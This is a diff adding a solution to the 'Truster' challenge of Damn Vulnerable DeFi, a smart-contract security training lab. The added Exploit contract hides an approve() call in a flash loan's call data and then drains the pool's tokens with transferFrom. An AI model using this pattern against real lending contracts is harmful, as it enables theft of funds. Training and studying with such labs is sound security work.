@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +51,11 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Deploy exploit contract
+        Exploit exploit = new Exploit(address(pool), address(token), recovery);
+
+        // Execute attack
+        exploit.attack();
     }
 
     /**
@@ -64,5 +68,26 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Exploit {
+    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
+
+    TrusterLenderPool public pool;
+    address public token;
+    address public recovery;
+
+    constructor(address _pool, address _token, address _recovery) {
+        pool = TrusterLenderPool(_pool);
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
+        pool.flashLoan(0, address(pool), token, payload);
+
+        DamnValuableToken(token).transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 }
